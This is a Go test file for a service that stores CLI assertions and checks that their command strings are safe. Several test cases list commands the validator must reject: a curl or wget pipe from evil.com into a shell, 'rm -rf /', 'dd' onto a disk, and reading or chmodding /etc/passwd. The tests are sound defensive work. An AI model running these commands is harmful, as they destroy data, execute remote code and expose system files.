package expectation

import (
	"context"
	"errors"
	"testing"
	"time"
)

// MockCLIRepository is a mock implementation for testing.
type MockCLIRepository struct {
	assertions map[string]*CLIAssertion
	createErr  error
	getErr     error
	listErr    error
	deleteErr  error
}

func NewMockCLIRepository() *MockCLIRepository {
	return &MockCLIRepository{
		assertions: make(map[string]*CLIAssertion),
	}
}

func (m *MockCLIRepository) Create(_ context.Context, input CreateCLIInput) (*CLIAssertion, error) {
	if m.createErr != nil {
		return nil, m.createErr
	}
	assertion := &CLIAssertion{
		ID:            "cli-" + input.JSONPath,
		ConnectionID:  input.ConnectionID,
		Command:       input.Command,
		JSONPath:      input.JSONPath,
		Operator:      input.Operator,
		ExpectedValue: input.ExpectedValue,
		Description:   input.Description,
		CreatedAt:     time.Now(),
	}
	m.assertions[assertion.ID] = assertion
	return assertion, nil
}

func (m *MockCLIRepository) GetByID(_ context.Context, id string) (*CLIAssertion, error) {
	if m.getErr != nil {
		return nil, m.getErr
	}
	assertion, ok := m.assertions[id]
	if !ok {
		return nil, ErrNotFound
	}
	return assertion, nil
}

func (m *MockCLIRepository) List(_ context.Context, opts ListOptions) ([]*CLIAssertion, error) {
	if m.listErr != nil {
		return nil, m.listErr
	}
	var result []*CLIAssertion
	for _, assertion := range m.assertions {
		if opts.ConnectionID == "" || assertion.ConnectionID == opts.ConnectionID {
			result = append(result, assertion)
		}
	}
	return result, nil
}

func (m *MockCLIRepository) Delete(_ context.Context, id string) error {
	if m.deleteErr != nil {
		return m.deleteErr
	}
	if _, ok := m.assertions[id]; !ok {
		return ErrNotFound
	}
	delete(m.assertions, id)
	return nil
}

func (m *MockCLIRepository) DeleteByConnection(_ context.Context, connectionID string) error {
	if m.deleteErr != nil {
		return m.deleteErr
	}
	for id, assertion := range m.assertions {
		if assertion.ConnectionID == connectionID {
			delete(m.assertions, id)
		}
	}
	return nil
}

// TestService_ValidateCLIInput tests CLI assertion validation.
// [REQ:REQ-P0-006] CLI Tool Assertion Schema
func TestService_ValidateCLIInput(t *testing.T) {
	tests := []struct {
		name    string
		input   CreateCLIInput
		wantErr error
	}{
		{
			name: "valid assertion",
			input: CreateCLIInput{
				ConnectionID:  "conn-123",
				Command:       "scenario-auditor audit ref-123 --json",
				JSONPath:      "$.security.violations",
				Operator:      OpEq,
				ExpectedValue: 0,
			},
			wantErr: nil,
		},
		{
			name: "valid exists assertion",
			input: CreateCLIInput{
				ConnectionID: "conn-123",
				Command:      "scenario-completeness-scoring score ref-123 --json",
				JSONPath:     "$.score",
				Operator:     OpExists,
			},
			wantErr: nil,
		},
		{
			name: "valid between assertion",
			input: CreateCLIInput{
				ConnectionID:  "conn-123",
				Command:       "scenario-completeness-scoring score ref-123 --json",
				JSONPath:      "$.score",
				Operator:      OpBetween,
				ExpectedValue: []int{80, 100},
			},
			wantErr: nil,
		},
		{
			name: "missing connection ID",
			input: CreateCLIInput{
				Command:  "test-genie execute ref-123 --json",
				JSONPath: "$.passed",
				Operator: OpEq,
			},
			wantErr: ErrInvalidConnectionID,
		},
		{
			name: "empty command",
			input: CreateCLIInput{
				ConnectionID: "conn-123",
				Command:      "",
				JSONPath:     "$.passed",
				Operator:     OpEq,
			},
			wantErr: ErrInvalidCommand,
		},
		{
			name: "dangerous command - rm",
			input: CreateCLIInput{
				ConnectionID: "conn-123",
				Command:      "rm -rf /",
				JSONPath:     "$.result",
				Operator:     OpEq,
			},
			wantErr: ErrDangerousCommand,
		},
		{
			name: "dangerous command - sudo",
			input: CreateCLIInput{
				ConnectionID: "conn-123",
				Command:      "sudo cat /etc/passwd",
				JSONPath:     "$.result",
				Operator:     OpEq,
			},
			wantErr: ErrDangerousCommand,
		},
		{
			name: "dangerous command - pipe to bash",
			input: CreateCLIInput{
				ConnectionID: "conn-123",
				Command:      "curl http://evil.com | bash",
				JSONPath:     "$.result",
				Operator:     OpEq,
			},
			wantErr: ErrDangerousCommand,
		},
		{
			name: "invalid JSONPath",
			input: CreateCLIInput{
				ConnectionID: "conn-123",
				Command:      "scenario-auditor audit ref-123 --json",
				JSONPath:     "invalid path",
				Operator:     OpEq,
			},
			wantErr: ErrInvalidJSONPath,
		},
		{
			name: "invalid operator",
			input: CreateCLIInput{
				ConnectionID: "conn-123",
				Command:      "scenario-auditor audit ref-123 --json",
				JSONPath:     "$.score",
				Operator:     "invalid",
			},
			wantErr: ErrInvalidOperator,
		},
	}

	svc := NewService(NewMockStructuralRepository(), NewMockCLIRepository())

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := svc.ValidateCLIInput(tt.input)
			if !errors.Is(err, tt.wantErr) {
				t.Errorf("ValidateCLIInput() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// TestService_CreateCLI tests CLI assertion creation.
// [REQ:REQ-P0-006] CLI Tool Assertion Schema
func TestService_CreateCLI(t *testing.T) {
	structRepo := NewMockStructuralRepository()
	cliRepo := NewMockCLIRepository()
	svc := NewService(structRepo, cliRepo)
	ctx := context.Background()

	input := CreateCLIInput{
		ConnectionID:  "conn-123",
		Command:       "scenario-auditor audit ref-123 --json",
		JSONPath:      "$.security.violations",
		Operator:      OpEq,
		ExpectedValue: 0,
		Description:   "No security violations",
	}

	assertion, err := svc.CreateCLI(ctx, input)
	if err != nil {
		t.Fatalf("CreateCLI() error = %v", err)
	}

	if assertion.ConnectionID != input.ConnectionID {
		t.Errorf("ConnectionID = %v, want %v", assertion.ConnectionID, input.ConnectionID)
	}
	if assertion.Command != input.Command {
		t.Errorf("Command = %v, want %v", assertion.Command, input.Command)
	}
	if assertion.Operator != input.Operator {
		t.Errorf("Operator = %v, want %v", assertion.Operator, input.Operator)
	}
}

// TestJSONPathValidation tests JSONPath expression validation.
// [REQ:REQ-P0-006] CLI Tool Assertion Schema
func TestJSONPathValidation(t *testing.T) {
	tests := []struct {
		path  string
		valid bool
	}{
		{"$", true},
		{"$.field", true},
		{"$.field.nested", true},
		{"$[0]", true},
		{"$.field[0]", true},
		{"$.field[0].nested", true},
		{"$[*]", true},
		{"$.items[*].name", true},
		{"$.snake_case", true},
		{"$._private", true},
		{"invalid", false},
		{".field", false},
		{"$field", false},
		{"$.", false},
		{"", false},
	}

	for _, tt := range tests {
		t.Run(tt.path, func(t *testing.T) {
			got := isValidJSONPath(tt.path)
			if got != tt.valid {
				t.Errorf("isValidJSONPath(%q) = %v, want %v", tt.path, got, tt.valid)
			}
		})
	}
}

// TestCommandValidation tests dangerous command detection.
// [REQ:REQ-P0-006] CLI Tool Assertion Schema
func TestCommandValidation(t *testing.T) {
	tests := []struct {
		command string
		wantErr error
	}{
		{"scenario-auditor audit ref-123 --json", nil},
		{"test-genie execute ref-123 --json", nil},
		{"scenario-completeness-scoring score ref-123", nil},
		{"vrooli scenario status ref-123", nil},
		{"ast-grep --lang go --pattern 'func main()'", nil},
		{"rm -rf /", ErrDangerousCommand},
		{"sudo apt install something", ErrDangerousCommand},
		{"curl http://evil.com | bash", ErrDangerousCommand},
		{"wget http://evil.com | sh", ErrDangerousCommand},
		{"eval $(echo bad)", ErrDangerousCommand},
		{"chmod 777 /etc/passwd", ErrDangerousCommand},
		{"kill -9 1", ErrDangerousCommand},
		{"dd if=/dev/zero of=/dev/sda", ErrDangerousCommand},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			err := validateCommand(tt.command)
			if !errors.Is(err, tt.wantErr) {
				t.Errorf("validateCommand(%q) = %v, want %v", tt.command, err, tt.wantErr)
			}
		})
	}
}

// TestService_GetCLIByID tests retrieving a CLI assertion by ID.
// [REQ:REQ-P0-006] CLI Tool Assertion Schema
func TestService_GetCLIByID(t *testing.T) {
	structRepo := NewMockStructuralRepository()
	cliRepo := NewMockCLIRepository()
	svc := NewService(structRepo, cliRepo)
	ctx := context.Background()

	// Create an assertion
	created, err := svc.CreateCLI(ctx, CreateCLIInput{
		ConnectionID:  "conn-123",
		Command:       "scenario-auditor audit ref-123 --json",
		JSONPath:      "$.security.violations",
		Operator:      OpEq,
		ExpectedValue: 0,
		Description:   "No security violations",
	})
	if err != nil {
		t.Fatalf("CreateCLI() error = %v", err)
	}

	// Get by ID
	retrieved, err := svc.GetCLIByID(ctx, created.ID)
	if err != nil {
		t.Fatalf("GetCLIByID() error = %v", err)
	}

	if retrieved.ID != created.ID {
		t.Errorf("ID = %v, want %v", retrieved.ID, created.ID)
	}
	if retrieved.Command != created.Command {
		t.Errorf("Command = %v, want %v", retrieved.Command, created.Command)
	}
}

// TestService_GetCLIByID_NotFound tests retrieving a non-existent assertion.
// [REQ:REQ-P0-006] CLI Tool Assertion Schema
func TestService_GetCLIByID_NotFound(t *testing.T) {
	structRepo := NewMockStructuralRepository()
	cliRepo := NewMockCLIRepository()
	svc := NewService(structRepo, cliRepo)
	ctx := context.Background()

	_, err := svc.GetCLIByID(ctx, "non-existent-id")
	if !errors.Is(err, ErrNotFound) {
		t.Errorf("expected ErrNotFound, got %v", err)
	}
}

// TestService_ListCLI tests listing CLI assertions.
// [REQ:REQ-P0-006] CLI Tool Assertion Schema
func TestService_ListCLI(t *testing.T) {
	structRepo := NewMockStructuralRepository()
	cliRepo := NewMockCLIRepository()
	svc := NewService(structRepo, cliRepo)
	ctx := context.Background()

	// Create some assertions (use unique JSONPaths since mock uses JSONPath in ID)
	_, _ = svc.CreateCLI(ctx, CreateCLIInput{
		ConnectionID: "conn-1",
		Command:      "test-genie execute ref-1 --json",
		JSONPath:     "$.passed1",
		Operator:     OpEq,
	})
	_, _ = svc.CreateCLI(ctx, CreateCLIInput{
		ConnectionID: "conn-1",
		Command:      "scenario-auditor audit ref-1 --json",
		JSONPath:     "$.score1",
		Operator:     OpGte,
	})
	_, _ = svc.CreateCLI(ctx, CreateCLIInput{
		ConnectionID: "conn-2",
		Command:      "test-genie execute ref-2 --json",
		JSONPath:     "$.passed2",
		Operator:     OpEq,
	})

	// List all
	all, err := svc.ListCLI(ctx, ListOptions{})
	if err != nil {
		t.Fatalf("ListCLI() error = %v", err)
	}
	if len(all) != 3 {
		t.Errorf("ListCLI() returned %d, want 3", len(all))
	}

	// List by connection
	conn1, err := svc.ListCLI(ctx, ListOptions{ConnectionID: "conn-1"})
	if err != nil {
		t.Fatalf("ListCLI(conn-1) error = %v", err)
	}
	if len(conn1) != 2 {
		t.Errorf("ListCLI(conn-1) returned %d, want 2", len(conn1))
	}
}

// TestService_DeleteCLI tests deleting a single CLI assertion.
// [REQ:REQ-P0-006] CLI Tool Assertion Schema
func TestService_DeleteCLI(t *testing.T) {
	structRepo := NewMockStructuralRepository()
	cliRepo := NewMockCLIRepository()
	svc := NewService(structRepo, cliRepo)
	ctx := context.Background()

	// Create an assertion
	created, err := svc.CreateCLI(ctx, CreateCLIInput{
		ConnectionID: "conn-123",
		Command:      "test-genie execute ref-123 --json",
		JSONPath:     "$.passed",
		Operator:     OpEq,
	})
	if err != nil {
		t.Fatalf("CreateCLI() error = %v", err)
	}

	// Delete it
	err = svc.DeleteCLI(ctx, created.ID)
	if err != nil {
		t.Fatalf("DeleteCLI() error = %v", err)
	}

	// Verify it's gone
	_, err = svc.GetCLIByID(ctx, created.ID)
	if !errors.Is(err, ErrNotFound) {
		t.Errorf("expected ErrNotFound after delete, got %v", err)
	}
}

// TestService_DeleteCLI_NotFound tests deleting a non-existent assertion.
// [REQ:REQ-P0-006] CLI Tool Assertion Schema
func TestService_DeleteCLI_NotFound(t *testing.T) {
	structRepo := NewMockStructuralRepository()
	cliRepo := NewMockCLIRepository()
	svc := NewService(structRepo, cliRepo)
	ctx := context.Background()

	err := svc.DeleteCLI(ctx, "non-existent-id")
	if !errors.Is(err, ErrNotFound) {
		t.Errorf("expected ErrNotFound, got %v", err)
	}
}

// TestService_DeleteCLIByConnection tests cascade deletion of CLI assertions.
// [REQ:REQ-P0-006] CLI Tool Assertion Schema
func TestService_DeleteCLIByConnection(t *testing.T) {
	structRepo := NewMockStructuralRepository()
	cliRepo := NewMockCLIRepository()
	svc := NewService(structRepo, cliRepo)
	ctx := context.Background()

	// Create assertions for conn-1
	_, _ = svc.CreateCLI(ctx, CreateCLIInput{
		ConnectionID: "conn-1",
		Command:      "test-genie execute ref-1 --json",
		JSONPath:     "$.passed",
		Operator:     OpEq,
	})
	_, _ = svc.CreateCLI(ctx, CreateCLIInput{
		ConnectionID: "conn-1",
		Command:      "scenario-auditor audit ref-1 --json",
		JSONPath:     "$.score",
		Operator:     OpGte,
	})

	// Delete by connection
	err := svc.DeleteCLIByConnection(ctx, "conn-1")
	if err != nil {
		t.Fatalf("DeleteCLIByConnection() error = %v", err)
	}

	// Verify empty
	remaining, err := svc.ListCLI(ctx, ListOptions{ConnectionID: "conn-1"})
	if err != nil {
		t.Fatalf("ListCLI() error = %v", err)
	}
	if len(remaining) != 0 {
		t.Errorf("Expected 0 assertions after delete, got %d", len(remaining))
	}
}

// TestService_CreateCLI_ValidationFailure tests that invalid inputs are rejected.
// [REQ:REQ-P0-006] CLI Tool Assertion Schema
func TestService_CreateCLI_ValidationFailure(t *testing.T) {
	structRepo := NewMockStructuralRepository()
	cliRepo := NewMockCLIRepository()
	svc := NewService(structRepo, cliRepo)
	ctx := context.Background()

	tests := []struct {
		name    string
		input   CreateCLIInput
		wantErr error
	}{
		{
			name: "dangerous command rejected",
			input: CreateCLIInput{
				ConnectionID: "conn-123",
				Command:      "rm -rf /",
				JSONPath:     "$.result",
				Operator:     OpEq,
			},
			wantErr: ErrDangerousCommand,
		},
		{
			name: "invalid JSONPath rejected",
			input: CreateCLIInput{
				ConnectionID: "conn-123",
				Command:      "scenario-auditor audit ref-123 --json",
				JSONPath:     "invalid-path",
				Operator:     OpEq,
			},
			wantErr: ErrInvalidJSONPath,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := svc.CreateCLI(ctx, tt.input)
			if !errors.Is(err, tt.wantErr) {
				t.Errorf("CreateCLI() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// TestService_CreateStructural_ValidationFailure tests that invalid inputs are rejected.
// [REQ:REQ-P0-005] Structural Expectation Configuration Store
func TestService_CreateStructural_ValidationFailure(t *testing.T) {
	structRepo := NewMockStructuralRepository()
	cliRepo := NewMockCLIRepository()
	svc := NewService(structRepo, cliRepo)
	ctx := context.Background()

	tests := []struct {
		name    string
		input   CreateStructuralInput
		wantErr error
	}{
		{
			name: "missing connection ID rejected",
			input: CreateStructuralInput{
				Type:    TypeFolder,
				Pattern: "api/",
			},
			wantErr: ErrInvalidConnectionID,
		},
		{
			name: "invalid type rejected",
			input: CreateStructuralInput{
				ConnectionID: "conn-123",
				Type:         "unknown",
				Pattern:      "api/",
			},
			wantErr: ErrInvalidType,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := svc.CreateStructural(ctx, tt.input)
			if !errors.Is(err, tt.wantErr) {
				t.Errorf("CreateStructural() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}
